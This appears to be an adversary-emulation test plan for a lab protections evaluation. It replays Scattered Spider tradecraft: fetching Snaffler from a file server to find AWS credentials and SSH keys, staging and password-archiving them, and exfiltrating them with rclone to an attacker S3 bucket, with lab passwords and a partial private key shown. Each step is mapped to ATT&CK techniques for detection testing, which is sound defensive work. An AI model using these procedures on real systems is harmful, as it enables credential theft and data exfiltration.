# Protections Test 1 Scenario

[2]:https://cloud.google.com/blog/topics/threat-intelligence/unc3944-sms-phishing-sim-swapping-ransomware/
[3]:https://unit42.paloaltonetworks.com/muddled-libra/

## Step 0 - Setup

### Procedures

- ☣️ Initiate an RDP session to the Kali attack host `driftmark (174.3.0.70)`

  | Destination | Username | Password
  |  - | - | -
  | 174.3.0.70 | op1 | Barbed-Directive

- ☣️ In a new terminal window, start the simple file server **if it is not already
running**:

  ```bash
  cd /opt/kalidev/scattered_spider/Resources/controlServer
  sudo go build -o controlServer main.go
  sudo ./controlServer -c config/protections.yml
  ```

  - ***Expected Output***

    ```text
    ...
    [SUCCESS] 2024/04/01 10:10:11 Started handler simplefileserver
    [INFO] 2024/04/01 10:10:11 Waiting for connections
    ```

- ☣️ Initiate an RDP session to the protections Windows jumpbox `dreadfort
(10.26.3.125)`

  | Destination | Username | Password
  |  - | - | -
  | 10.26.3.125 | op1 | Barbed-Directive

- From the Windows jumpbox `dreadfort (10.26.3.125)`, start an RDP session to the
following host: `tentowers (10.26.4.102)`

  | Destination | Username | Password
  |  - | - | -
  | 10.26.4.102 | vale\tharlaw | Wrecking-Pumice

## Step 1 - Credential Access

### Voice Track

Once inside of the compromised environment, Scattered Spider downloads `Snaffler` from
adversary file server. Scattered Spider uses a combination of Snaffler and some native
tools to search registries, local drives, and network shares.

### Procedures

- ☣️ In the RDP to `tentowers (10.26.4.102)`, minimize any spurious windows. Open
FireFox and paste the url for the Snaffler release download. After downloading
Snaffler, minimize the FireFox window.

  | Destination
  |  -
  | <http://pasteme.io/files/Snaffler.exe>

- ☣️ After the Snaffler download is complete, search for cmd.exe and right-click
to Run As Administrator. After the command prompt window opens use the following
command to run Snaffler (about 5 minutes to complete). Ensure the output
contains the following discovered files: `C:\Users\tharlaw\.aws\credentials`,
`C:\Users\tharlaw\.aws\config`, `C:\Users\tharlaw\.ssh\id_ed25519`.

  ```cmd
  C:\Users\tharlaw\Downloads\Snaffler.exe -s -o C:\Users\Public\sn.log -i C:\
  ```

  - ***Expected Output***

    ```text
    [vale\tharlaw@tentowers] 2025-01-28 13:43:29Z [Info] Parsing args...
    [vale\tharlaw@tentowers] 2025-01-28 13:43:30Z [Info] Parsed args successfully.
    [vale\tharlaw@tentowers] 2025-01-28 13:43:30Z [Info] Creating a TreeWalker task for C:\
    [vale\tharlaw@tentowers] 2025-01-28 13:43:30Z [Info] Created all TreeWalker tasks.
    ...
    [vale\tharlaw@tentowers] 2025-01-28 13:43:31Z [File] {Black}<KeepCloudApiKeysByPath|R|\\\.aws\\|117B|2024-12-03 16:01:56Z>(C:\users\tharlaw\.aws\credentials) C:\users\tharlaw\.aws\credentials
    ...
    [vale\tharlaw@tentowers] 2025-01-28 13:43:31Z [File] {Black}<KeepSSHKeysByFileName|R|^id_ed25519$|2.6kB|2024-12-03 16:01:56Z>(C:\users\tharlaw\.ssh\id_ed25519) id_ed25519
    ...
    [vale\tharlaw@tentowers] 2025-01-28 13:43:31Z [File] {Black}<KeepCloudApiKeysByPath|R|\\\.aws\\|90B|2024-12-03 16:01:56Z>(C:\users\tharlaw\.aws\config) C:\users\tharlaw\.aws\config
    ...
    [vale\tharlaw@tentowers] 2025-01-28 13:43:31Z [File] {Green}<KeepNameContainsGreen|R|credential|117B|2024-12-03 16:01:56Z>(C:\users\tharlaw\.aws\credentials) credentials
    ...
    [vale\tharlaw@tentowers] 2025-01-28 13:43:31Z [File] {Red}<KeepInlinePrivateKey|R|-----BEGIN( RSA| OPENSSH| DSA| EC| PGP)? PRIVATE KEY( BLOCK)?-----|2.6kB|2024-12-03 16:01:56Z>
    (C:\users\tharlaw\.ssh\id_ed25519) -----BEGIN\ OPENSSH\ PRIVATE\ KEY-----\r\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn\r\nNhAAAAAwEAAQAAAYEAy9CHPGMdPKYYJViSbyHZLN6HPK0asN85xVAWUXAGO23WdiEebi0l\r\n/Ry7XIqBKfCJwscNAMZvR5pIHUI0PaY71EZF2lrLy36gQtOF\+ToA97Mlgdx\+9TdPCJkB8f\r\n9pHfYVtTAqvHOLyl/3nliy1VzhAQ1lIRhjRhyU4pKQ6mEnXpNdFQm7QaeEPWXjearxmIbN\r\nWUX6l0kYednkJ/CN5ILRWGe61wTDP87MYnRIwyHk5g46Zlds/phhhVmWd8ZQXiq7ss5LJf\r\nizg
    ...
    Snaffler out.
    I snaffled 'til the snafflin was done.
    ```

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
|  - | - | - | - | - | - | - | - | - | - | -
| Command and Control | T1105 | Ingress Tool Transfer | Windows | tharlaw downloads snaffler.exe from <http://pasteme.io/files/Snaffler.exe> | Calibrated - Not Benign | Scattered Spider downloads Snaffler | tentowers (10.26.4.102) | tharlaw | [Snaffler](../Resources/snaffler) | [3]
| Credential Access | T1552.001 | Unsecured Credentials: Credentials In Files | Windows | cmd.exe executed snaffler.exe and stored data in a .log file | Calibrated - Not Benign | Scattered Spider Runs Snaffler and discovers credential files. | tentowers (10.26.4.102) | tharlaw | [Snaffler](../Resources/snaffler) | [3]

## Step 2 - Exfiltration

### Voice Track

Once Scattered Spider discovers data of interest, the data is staged in a local direcory,
archived using WinRAR, then exfiltrated using Rclone.

### Procedures

- ☣️ Once Snaffler has finished running, move the following files to the staging
area `C:\Windows\Temp\0937B91A` in preparation for exfiltration.

  ```cmd
  mkdir C:\Windows\Temp\0937B91A
   copy C:\Users\tharlaw\.aws\credentials C:\Windows\Temp\0937B91A
   copy C:\Users\tharlaw\.aws\config C:\Windows\Temp\0937B91A
   copy C:\Users\tharlaw\.ssh\id_ed25519 C:\Windows\Temp\0937B91A
  ```

  - ***Expected Output***

    ```text
    > copy C:\Users\tharlaw\.aws\credentials C:\Windows\Temp\0937B91A
      1 file(s) copied.
    > copy C:\Users\tharlaw\.aws\config C:\Windows\Temp\0937B91A
      1 file(s) copied.
    > copy C:\Users\tharlaw\.ssh\id_ed25519 C:\Windows\Temp\0937B91A
      1 file(s) copied.

    ```

- ☣️ In a new File Explorer window, browse to the staging directory
`C:\Windows\Temp\0937B91A` and select all of the files in the folder. Right
click on one of the selected files, hover over WinRAR and choose `Add to
Archive`. Name the Archive `0937B91A`. Finally, choose `Set Password...` and
type in `archive_pwd`. Retype `archive_pwd` to confirm the password is correct,
then press Ok. Press Ok again to create the Archive.

- ☣️ Return to the minimized FireFox window and browse to the following link to
download rclone.

  | Destination
  |  -
  | <https://github.com/rclone/rclone/releases/download/v1.64.0/rclone-v1.64.0-windows-amd64.zip>

- ☣️ Before continuing, return to Kali and obtain the attacker S3 access and
secret access keys.

- ☣️ Return to the Windows host `tentowers` and go to the Downloads folder,
right-click the rclone zip, click `Extract all...` from the menu, and in the
window that opens, click the Extract button

- ☣️ Using the existing Command Prompt window change directories to the directory
containing the rclone executable and open the rclone config

  ```cmd
  cd C:\Users\tharlaw\Downloads\rclone-v1.64.0-windows-amd64\rclone-v1.64.0-windows-amd64
  rclone config
  ```

- ☣️ Use the following steps to configure rclone:

  ```text
  1. On entry to the rclone config console, type "n" for "New remote" then press Enter
  2. For the name of the remote, type "s3" then press Enter
  3. For the type of storage to configure, type "5" for "Amazon S3 Compliant Storage Providers" then press Enter
  4. For the S3 provider, type "1" for "Amazon Web Services (AWS) S3"
  5. For the env_auth, type 1 for "Enter AWS credentials in the next step." then press Enter. Proceed with entering the adversary's access key, then secret access key from the Kali output in the previous substep.
  6. For the region, type "us-east-1" then press Enter
  7. For the endpoint, press Enter to leave blank
  8. For the `location_constraint`, press Enter to leave empty
  9. For the ACL, press Enter to leave empty
  10. For the `server_side_encryption`, press Enter to leave empty
  11. For the `sse_kms_key_id`, press Enter to leave empty
  12. For the `storage_class`, press Enter to leave empty
  13. For editing the advanced config, press Enter to proceed. Review the configuration then press Enter to proceed and type "q" to quit the rclone configuration menu.
  ```

- ☣️ Using the existing cmd.exe terminal, exfiltrate the rar archive file using
rclone

  ```cmd
  rclone --s3-no-check-bucket copy "C:\Windows\Temp\0937B91A\0937B91A.rar" s3://REPLACE_WITH_ATTACKER_S3_BUCKET_NAME/
  ```

- ☣️ Switch to the Kali RDP session `driftmark (174.3.0.70)` and use the following
command to check for the exfiltrated winrar archive.

  ```bash
  export AWS_ACCESS_KEY_ID="REPLACE_WITH_BUCKET_ACCESS_KEY"
  export AWS_SECRET_ACCESS_KEY="REPLACE_WITH_BUCKET_SECRET_ACCESS_KEY"
  aws s3 ls s3://REPLACE_WITH_ATTACKER_S3_BUCKET_NAME/
  ```

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
|  - | - | - | - | - | - | - | - | - | - | -
| Collection | T1074.001 | Data Staged: Local Data Staging | Windows | tharlaw created files in the C:\Windows\Temp\ folder | Calibrated - Not Benign | Scattered Spider copies files containing sensitive data into the staging directory in preparation for exfiltration. | tentowers (10.26.4.102) | tharlaw | - | [3]
| Collection | T1560.001 | Archive Collected Data: Archive via Utility | Windows | tharlaw executed winrar.exe to archive files in the C:\Windows\Temp\ folder | Calibrated - Not Benign | Scattered Spider utilizes WinRAR to compress and password protect the file prior to exfiltration. | tentowers (10.26.4.102) | tharlaw | - | [3], [2]
| Command and Control | T1105 | Ingress Tool Transfer | Windows | rclone.zip was downloaded from a browser | Calibrated - Not Benign | Scattered Spider downloads rclone to exfiltrate the collected information. | tentowers (10.26.4.102) | tharlaw | <https://github.com/rclone/rclone> | [2]
| Exfiltration | T1567.002 | Exfiltration Over Web Service: Exfiltration to Cloud Storage | Windows | tharlaw executed rclone to copy C:\Windows\Temp\0937B91A\0937B91A.rar to AWS s3 bucket | Calibrated - Not Benign | Scattered Spider uses rclone to exfiltrate staged files to the attacker's S3 bucket | tentowers (10.26.4.102) | tharlaw | <https://github.com/rclone/rclone> | [2]

## End of Test

### Voice Track

This step includes the shutdown procedures for the end of this Protections Test

### Procedures

- Return to the RDP to `tentowers (10.26.4.102)`. Close the FireFox tabs used to
download Snaffler.exe and rclone, the File Explorer windows used to archive the
credential files, and the Command Prompt window used to execute the scenario
commands
